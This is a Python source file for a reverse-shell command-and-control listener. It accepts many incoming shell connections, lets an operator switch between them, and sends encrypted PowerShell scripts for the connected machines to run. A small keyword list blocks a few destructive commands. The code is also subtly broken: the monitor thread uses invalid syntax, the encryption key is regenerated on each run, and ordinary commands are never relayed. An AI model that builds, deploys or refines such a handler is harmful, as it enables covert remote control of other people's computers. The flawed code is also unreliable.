import socket
import threading
import logging
import time
import tkinter as tk
from tkinter import filedialog
from typing import Dict, Optional
import sys
import signal
from cryptography.fernet import Fernet
import argparse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('server.log')
    ]
)

class ShellServer:
    def __init__(self):
        self.active_shells: Dict[str, socket.socket] = {}
        self.current_shell: Optional[str] = None
        self.running: bool = True
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)
        
    def encrypt_data(self, data: str) -> bytes:
        """Encrypt data using Fernet encryption"""
        return self.cipher_suite.encrypt(data.encode())

    def decrypt_data(self, data: bytes) -> str:
        """Decrypt data using Fernet encryption"""
        try:
            return self.cipher_suite.decrypt(data).decode()
        except Exception as e:
            logging.error(f"Decryption error: {e}")
            return ""

    def start_server(self, ip: str, port: int) -> None:
        """Initialize and start the server"""
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((ip, port))
            server.listen(5)
            logging.info(f"Server listening on {ip}:{port}")

            # Set up signal handlers for graceful shutdown
            signal.signal(signal.SIGINT, self.shutdown_handler)
            signal.signal(signal.SIGTERM, self.shutdown_handler)

            while self.running:
                try:
                    client, addr = server.accept()
                    shell_id = f"{addr[0]}:{addr[1]}"
                    self.active_shells[shell_id] = client
                    logging.info(f"New connection from {shell_id}")
                    
                    client_handler = threading.Thread(
                        target=self.handle_client,
                        args=(client, shell_id),
                        daemon=True
                    )
                    client_handler.start()
                    
                except socket.error as e:
                    if self.running:  # Only log if not shutting down
                        logging.error(f"Socket error: {e}")
                        
        except Exception as e:
            logging.critical(f"Server error: {e}")
        finally:
            self.cleanup()

    def handle_client(self, client_socket: socket.socket, shell_id: str) -> None:
        """Handle individual client connections"""
        try:
            while self.running:
                try:
                    request = client_socket.recv(4096)
                    if not request:
                        break

                    command = self.decrypt_data(request)
                    if not command:
                        continue

                    response = self.process_command(command, shell_id)
                    encrypted_response = self.encrypt_data(response)
                    client_socket.send(encrypted_response)

                except socket.error as e:
                    logging.error(f"Connection error with {shell_id}: {e}")
                    break

        finally:
            self.remove_shell(shell_id)

    def process_command(self, command: str, shell_id: str) -> str:
        """Process incoming commands"""
        try:
            if command.startswith("enter "):
                return self.handle_enter_command(command)
            elif command == "exit":
                return self.handle_exit_command()
            elif command == "list":
                return self.handle_list_command()
            elif command == "run":
                return self.handle_run_command(shell_id)
            else:
                return self.handle_shell_command(command, shell_id)
        except Exception as e:
            logging.error(f"Command processing error: {e}")
            return f"Error processing command: {str(e)}"

    def handle_enter_command(self, command: str) -> str:
        shell_to_enter = command.split()[1]
        if shell_to_enter in self.active_shells:
            self.current_shell = shell_to_enter
            return f"Entered shell {shell_to_enter}"
        return f"Shell {shell_to_enter} not found"

    def handle_exit_command(self) -> str:
        self.current_shell = None
        return "Exited current shell"

    def handle_list_command(self) -> str:
        return "Active shells:\n" + "\n".join(self.active_shells.keys())

    def handle_run_command(self, shell_id: str) -> str:
        """Execute PowerShell script with improved security"""
        if shell_id not in self.active_shells:
            return "Shell not found"

        root = tk.Tk()
        root.withdraw()
        file_path = filedialog.askopenfilename(
            filetypes=[("PowerShell Scripts", "*.ps1")],
            title="Select PowerShell Script"
        )
        
        if not file_path:
            return "No script selected"

        try:
            with open(file_path, 'r') as file:
                script_content = file.read()
            
            # Add basic script validation
            if any(dangerous_cmd in script_content.lower() for dangerous_cmd in [
                "format-volume", "remove-item -recurse", "rm -rf"
            ]):
                return "Script contains potentially dangerous commands"

            encrypted_script = self.encrypt_data(script_content)
            self.active_shells[shell_id].send(encrypted_script)
            return f"Executing script: {file_path}"
            
        except Exception as e:
            logging.error(f"Script execution error: {e}")
            return f"Error executing script: {str(e)}"

    def handle_shell_command(self, command: str, shell_id: str) -> str:
        if self.current_shell == shell_id:
            # Add command validation here
            return f"Executing command: {command}"
        return f"Shell {shell_id} is not active"

    def remove_shell(self, shell_id: str) -> None:
        """Clean up disconnected shells"""
        if shell_id in self.active_shells:
            self.active_shells[shell_id].close()
            del self.active_shells[shell_id]
            if self.current_shell == shell_id:
                self.current_shell = None
            logging.info(f"Removed shell {shell_id}")

    def cleanup(self) -> None:
        """Clean up resources during shutdown"""
        for shell_id, client in self.active_shells.items():
            try:
                client.close()
                logging.info(f"Closed connection to {shell_id}")
            except:
                pass
        self.active_shells.clear()

    def shutdown_handler(self, signum, frame) -> None:
        """Handle graceful shutdown"""
        logging.info("Shutting down server...")
        self.running = False
        self.cleanup()
        sys.exit(0)

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description='Shell Server')
    parser.add_argument('--ip', default='0.0.0.0',
                       help='IP address to bind to (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, required=True,
                       help='Port to listen on')
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_arguments()
    server = ShellServer()
    
    # Start monitoring thread
    monitor_thread = threading.Thread(
        target=lambda: (
            logging.info("Shell monitor started"),
            [time.sleep(10) or logging.info(f"Active shells: {list(server.active_shells.keys())}")
             while server.running]
        ),
        daemon=True
    )
    monitor_thread.start()
    
    # Start server
    server.start_server(args.ip, args.port)
